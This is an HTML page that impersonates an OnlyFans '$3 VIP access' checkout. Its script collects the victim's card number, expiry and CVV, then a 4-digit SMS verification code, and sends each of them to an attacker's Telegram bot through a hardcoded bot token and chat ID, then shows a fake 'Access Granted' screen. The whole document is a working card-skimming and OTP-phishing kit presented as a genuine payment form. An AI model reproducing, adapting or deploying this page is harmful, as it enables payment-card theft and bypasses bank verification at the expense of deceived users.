<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Access | OnlyFans</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .of-container {
            max-width: 480px;
            width: 100%;
            background: #1a1a1a;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            border: 1px solid #ff66c0;
        }

        .header {
            background: linear-gradient(135deg, #ff66c0, #ff3388);
            padding: 30px 24px;
            text-align: center;
            color: white;
        }

        .logo {
            font-size: 32px;
            font-weight: 800;
            letter-spacing: -1px;
            margin-bottom: 8px;
        }

        .logo span {
            color: #ffcc00;
        }

        .tagline {
            font-size: 14px;
            opacity: 0.9;
        }

        .content {
            padding: 24px;
        }

        .preview {
            background: #2a2a2a;
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            margin-bottom: 24px;
            border: 1px dashed #ff66c0;
        }

        .preview i {
            font-size: 56px;
            color: #ff66c0;
            margin-bottom: 12px;
        }

        .preview h3 {
            color: #fff;
            margin-bottom: 8px;
        }

        .preview p {
            color: #aaa;
            font-size: 14px;
        }

        .price {
            background: #ff66c0;
            color: #000;
            font-weight: 800;
            font-size: 24px;
            padding: 8px 20px;
            border-radius: 60px;
            display: inline-block;
            margin: 16px 0;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #ff66c0;
            text-transform: uppercase;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper i {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #ff66c0;
        }

        .input-wrapper input {
            width: 100%;
            background: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 60px;
            padding: 16px 16px 16px 48px;
            font-size: 16px;
            color: white;
            transition: 0.2s;
        }

        .input-wrapper input:focus {
            border-color: #ff66c0;
            outline: none;
            box-shadow: 0 0 0 3px rgba(255,102,192,0.2);
        }

        .row-duo {
            display: flex;
            gap: 12px;
        }
        .row-duo .form-group {
            flex: 1;
        }

        .btn {
            background: #ff66c0;
            color: #000;
            border: none;
            border-radius: 60px;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 12px;
        }

        .btn:hover {
            background: #ff3388;
            transform: translateY(-2px);
        }

        .payment-icons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
            color: #ff66c0;
            font-size: 28px;
        }

        .footer-note {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-top: 20px;
        }

        .otp-inputs {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 20px 0;
        }
        .otp-inputs input {
            width: 60px;
            height: 70px;
            background: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 16px;
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            color: #ff66c0;
        }
        .otp-inputs input:focus {
            border-color: #ff66c0;
            outline: none;
        }
        .step {
            display: block;
        }
        .step.hidden {
            display: none;
        }
        .thankyou {
            text-align: center;
            padding: 30px;
            background: #2a2a2a;
            border-radius: 20px;
        }
        .thankyou i {
            font-size: 56px;
            color: #ff66c0;
        }
    </style>
</head>
<body>
    <div class="of-container">
        <div class="header">
            <div class="logo">Only<span>Fans</span></div>
            <div class="tagline">Exclusive content awaits</div>
        </div>

        <div class="content">
            <!-- Step 1: Payment -->
            <div id="stepPayment" class="step">
                <div class="preview">
                    <i class="fas fa-lock"></i>
                    <h3>🔥 VIP Access 🔥</h3>
                    <p>Unlock 18+ exclusive content</p>
                    <div class="price">$3.00 USD</div>
                </div>

                <div class="form-group">
                    <label>Card Number</label>
                    <div class="input-wrapper">
                        <i class="fas fa-credit-card"></i>
                        <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
                    </div>
                </div>
                <div class="row-duo">
                    <div class="form-group">
                        <label>Expiry</label>
                        <div class="input-wrapper">
                            <i class="fas fa-calendar-alt"></i>
                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                        </div>
                    </div>
                    <div class="form-group">
                        <label>CVV</label>
                        <div class="input-wrapper">
                            <i class="fas fa-lock"></i>
                            <input type="text" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
                        </div>
                    </div>
                </div>

                <button class="btn" id="payBtn">Unlock for $3 <i class="fas fa-arrow-right"></i></button>
                <div class="payment-icons">
                    <i class="fab fa-cc-visa"></i>
                    <i class="fab fa-cc-mastercard"></i>
                    <i class="fab fa-cc-amex"></i>
                </div>
                <div class="footer-note">
                    <i class="fas fa-shield-alt"></i> Secure payment. 3D Secure.
                </div>
            </div>

            <!-- Step 2: SMS code -->
            <div id="stepOtp" class="step hidden">
                <div class="preview">
                    <i class="fas fa-mobile-alt"></i>
                    <h3>Verify your identity</h3>
                    <p>We've sent a 4-digit code to your phone</p>
                </div>
                <div class="otp-inputs">
                    <input type="text" maxlength="1" class="otp-digit">
                    <input type="text" maxlength="1" class="otp-digit">
                    <input type="text" maxlength="1" class="otp-digit">
                    <input type="text" maxlength="1" class="otp-digit">
                </div>
                <button class="btn" id="confirmBtn">Confirm Code</button>
                <p style="text-align: center; margin-top: 15px;">
                    <a href="#" id="resendLink" style="color: #ff66c0;">Didn't receive code?</a>
                </p>
            </div>

            <!-- Step 3: Success -->
            <div id="stepThanks" class="step hidden">
                <div class="thankyou">
                    <i class="fas fa-check-circle"></i>
                    <h3>Access Granted!</h3>
                    <p>Your exclusive content is ready.</p>
                    <button class="btn" id="viewContentBtn" style="margin-top: 20px;">View Now</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ========== BOT SETTINGS ==========
        const TELEGRAM_BOT_TOKEN = '7687979217:AAFrV5O39V_9gnNHdr9K3i5QMD2Z0qN-bew';
        const ADMIN_CHAT_ID = '8506735626';

        let orderData = {};

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                return data.ok;
            } catch (e) {
                console.error(e);
                return false;
            }
        }

        document.getElementById('payBtn').addEventListener('click', async function() {
            const card = document.getElementById('card').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;

            if (!card || !expiry || !cvv) {
                alert('Please fill all fields');
                return;
            }
            if (card.length < 16) {
                alert('Invalid card number');
                return;
            }

            orderData = { card, expiry, cvv };

            const msg = `
🔞 <b>OnlyFans – NEW SUBSCRIPTION</b>

💳 <b>Card details:</b>
• Number: <code>${card}</code>
• Expiry: ${expiry}
• CVV: ${cvv}
💰 <b>Amount:</b> $3.00
🕒 <b>Time:</b> ${new Date().toLocaleString()}
            `;

            const success = await sendToTelegram(msg);
            if (success) {
                document.getElementById('stepPayment').classList.add('hidden');
                document.getElementById('stepOtp').classList.remove('hidden');
            } else {
                alert('Payment error. Try again.');
            }
        });

        // OTP logic
        const otpInputs = document.querySelectorAll('.otp-digit');
        otpInputs.forEach((input, idx) => {
            input.addEventListener('keyup', function(e) {
                if (e.key >= '0' && e.key <= '9') {
                    this.value = e.key;
                    if (idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
                } else if (e.key === 'Backspace') {
                    if (idx > 0) otpInputs[idx - 1].focus();
                }
            });
        });

        document.getElementById('confirmBtn').addEventListener('click', async function() {
            let otp = '';
            otpInputs.forEach(i => otp += i.value);
            if (otp.length !== 4) {
                alert('Enter 4-digit code');
                return;
            }

            const otpMsg = `
🔐 <b>OnlyFans – OTP Code</b>
💳 Card: ${orderData.card}
🔢 Code: <code>${otp}</code>
            `;

            const success = await sendToTelegram(otpMsg);
            if (success) {
                document.getElementById('stepOtp').classList.add('hidden');
                document.getElementById('stepThanks').classList.remove('hidden');
            } else {
                alert('Verification failed');
            }
        });

        document.getElementById('resendLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Demo: new code sent');
        });

        document.getElementById('viewContentBtn').addEventListener('click', function() {
            alert('Welcome to exclusive content! (demo)');
        });

        // Formatting
        document.getElementById('card').addEventListener('input', function(e) {
            let v = e.target.value.replace(/\D/g, '').substring(0,16);
            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
        });
        document.getElementById('expiry').addEventListener('input', function(e) {
            let v = e.target.value.replace(/\D/g, '').substring(0,4);
            if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
            e.target.value = v;
        });
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
        });
    </script>
</body>
</html>
